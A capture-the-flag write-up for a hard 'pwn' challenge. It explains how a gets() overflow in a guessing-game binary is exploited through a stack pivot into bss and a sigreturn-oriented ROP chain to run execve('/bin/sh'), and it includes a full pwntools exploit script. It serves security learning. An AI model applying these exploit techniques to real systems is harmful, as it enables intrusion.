+++
date = '2026-03-29'
title = 'MyOwnPrint'
tags = ['pwn', 'hard']
+++

Category: Pwn

Difficulty: Hard (85 points)

Author: azerloc

## Description

I've made a small guessing game with my own print function. Can you exploit it?

## Note

Unfortunately I didn't manage to finish this challenge during the event itself, since I realized a crucial part
about how to set the `rax` register 5 minutes before the end of the event, so I didn't have enough time to edit
my exploit during the event itself.

## Solution

This is the decompiled game function, and this is the function we will be exploiting.

```c
__int64 game()
{
  char buf[11]; // [rsp+5h] [rbp-1Bh] BYREF
  unsigned int v2; // [rsp+10h] [rbp-10h]
  _BYTE v3[10]; // [rsp+14h] [rbp-Ch] BYREF
  _BYTE v4[2]; // [rsp+1Eh] [rbp-2h] BYREF

  v2 = 0;
  strcpy(buf, "_________\n");
  myPrint("Guess a letter or enter '_' to submit your final answer.\n", 0x3Au);
  while ( v4[0] != 95 )
  {
    myPrint(buf, 0xAu);
    myPrint("Your input : ", 0xDu);
    __isoc99_scanf("%c", v4);
    getchar();
    ++v2;
    if ( v4[0] != 95 )
      updateString(buf, v4[0]);
  }
  myPrint("What is your final answer : ", 0x1Cu);
  gets(v3);
  if ( (unsigned int)stringCmp(v3, secret_string) )
    return 0xFFFFFFFFLL;
  else
    return v2;
}
```

We can see the final answer is read using `gets`, which doesn't do any length checks, 
and thus we have a buffer overflow vulnerability.

Then checking the security of the file, we can see we don't have PIE, so code addresses are static, but NX
is enabled, so the stack isn't executable.
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Checking the binary further, there is no "win" function anywhere, so we will need to get shell access.
There were also no "/bin/sh" strings in the binary, so the first goal is writing this at a known address.

The way I decided to do this was to use a ROP attack to call the game function again, and editing the `rbp` register on the stack,
which is popped at the end of game with the `leave` instruction. This makes it so the next time game is called it writes all it's data
in a location of our choosing, in this case I used the bss section.

So then this is the first payload we get:
```py
payload = b"A" * 12 # Padding to reach stack return address
payload += p64(bss_addr + 0x20)  # Set rbp to bss + 0x20 to make room for local vars
payload += p64(game_rerun_addr) # Run game again so we can write to bss
```

Now we will build the second payload, it needs to write `/bin/sh` into a known address, 
and perform a ROP attack again to execute an `execve` syscall.

To do this we check what gadgets we have, we have this syscall gadget in the `myPrint` function
if we jump to address `0x40116A`.
```asm
0x401156 myPrint         proc near               ; CODE XREF: game+33↓p
0x401156                                         ; game+46↓p ...
0x401156 ; __unwind {
0x401156                 mov     rax, 1
0x40115D                 mov     rdx, rsi        ; count
0x401160                 mov     rsi, rdi        ; buf
0x401163                 mov     rdi, 1          ; fd
0x40116A                 syscall                 ; LINUX - sys_write
0x40116C                 retn
0x40116C myPrint         endp
```

Unfortunately this is the only good gadget there is, there are some more gadgets that can set
`rax` to 0, and add and subtract a set number from it, but those were not really useful. 
This is were I went wrong during the event itself, I spent a lot of time trying to use these gadgets
to set `rax` to 15, but that used over 500 gadget calls, which caused the payload to be too large to
fit in bss.

Luckily there is a way around this, the game function does `return v2;` if the guessed string is correct,
and since v2 is just the amount of guessed needed, we can use this to set `rax` to a value of our choosing.

Since we still have no gadgets to set the other registers, we will set `rax` to 15, so we can call the 
`sigreturn` syscall. This allows us to fake a `sigcontext` frame, which allows us to set all registers
to our choosing, which will then allow us to do another syscall, this time an `execve` syscall to get
shell access.

This is the second part of our payload:
```py
# Syscall of sigreturn
payload2 = b'cyberpunk\0' # Correct guess, rax will be set to v2 = 15
payload2 += b'/bin/sh\0' # /bin/sh string
payload2 += b'A' * 2  # Padding to reach stack return address
payload2 += p64(syscall_gadget) # syscall(15), sigreturn

# Sigreturn frame that will execute execve
frame = SigreturnFrame()
frame.rax = 59 # execve
frame.rdi = bss_addr + 30 # /bin/sh string
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget
frame.rsp = 0
payload2 += bytes(frame)
```

And that's it, now we have shell access!

### Solution Script

```py
from pwn import *

context.arch = 'x86_64'

elf = ('./myprint')
p = process(elf)

game_rerun_addr = 0x401226
syscall_gadget = 0x40116a
bss_addr = 0x40403a

p.sendlineafter(b'Your input : ', b"_")
payload = b"A" * 12 # Padding to reach stack return address
payload += p64(bss_addr + 0x20)  # Set rbp to bss + 0x20 to make room for local vars
payload += p64(game_rerun_addr) # Run game again so we can write to bss
p.sendlineafter(b'What is your final answer : ', payload)

# Increment v2 to 15
for i in range(14):
    p.sendlineafter(b'Your input : ', b'A')
p.sendlineafter(b'Your input : ', b"_")

# Syscall of sigreturn
payload2 = b'cyberpunk\0' # Correct guess, rax will be set to v2 = 15
payload2 += b'/bin/sh\0' # /bin/sh string
payload2 += b'A' * 2  # Padding to reach stack return address
payload2 += p64(syscall_gadget) # syscall(15), sigreturn

# Sigreturn frame that will execute execve
frame = SigreturnFrame()
frame.rax = 59 # execve
frame.rdi = bss_addr + 30 # /bin/sh string
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget
frame.rsp = 0
payload2 += bytes(frame)

p.sendlineafter(b'What is your final answer : ', payload2)

p.interactive()
```